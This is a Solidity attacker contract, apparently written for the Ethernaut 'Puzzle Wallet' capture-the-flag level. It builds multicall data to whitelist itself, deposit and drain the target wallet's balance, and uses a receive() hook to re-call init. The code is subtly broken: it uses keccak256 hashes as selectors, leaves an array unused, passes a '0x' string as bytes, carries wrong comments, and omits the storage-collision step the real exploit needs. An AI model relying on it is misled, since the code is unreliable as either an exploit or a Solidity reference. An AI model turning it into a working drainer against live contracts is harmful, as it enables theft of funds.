pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function init(uint256 _maxBalance) external;
    function addToWhitelist(address) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function multicall(bytes[] calldata data) external payable;
}


contract PuzzleWalletAttacker {
    address puzzleWallet;

    constructor(address _puzzleWallet) {
        puzzleWallet = _puzzleWallet;
    }

    function attack() external payable {
        // 1. Whitelist attacker
        bytes4[] memory selectors = new bytes4[](4);
        selectors[0] = IPuzzleWallet(puzzleWallet).deposit.selector;
        selectors[1] = IPuzzleWallet(puzzleWallet).execute.selector;
        selectors[2] = IPuzzleWallet(puzzleWallet).setMaxBalance.selector;
        selectors[3] = IPuzzleWallet(puzzleWallet).init.selector;

        // Build multicall data for: add to whitelist + drain + set balance + init 
        bytes[3] memory calldatas;
        calldatas[0] = abi.encodeWithSelector(keccak256(abi.encodePacked("addToWhitelist")), address(this));
        calldatas[1] = abi.encodeWithSelector(keccak256(abi.encodePacked("deposit")));
        calldatas[2] = abi.encodeWithSelector(keccak256(abi.encodePacked("execute")), puzzleWallet, 0x3e8, "0x"); // 1 wei

        // Then in receive function we drain all funds
        bytes memory multicallData = abi.encodeWithSelector(
            IPuzzleWallet(puzzleWallet).multicall.selector,
            [calldatas[0], calldatas[1], calldatas[2]]
        );

        (bool success, ) = puzzleWallet.call(multicallData);
        require(success, "Attack failed");
    }

    // Reentrancy handler - can we get more gas here?
    receive() external payable {
        if (address(puzzleWallet).balance == 0) {
            bytes memory initCalldata = abi.encodeWithSelector(
                IPuzzleWallet(puzzleWallet).init.selector,
                0
            );
            (bool ok, ) = puzzleWallet.call{value: 0}(initCalldata);
            require(ok, "Init failed");
        }
    }
}
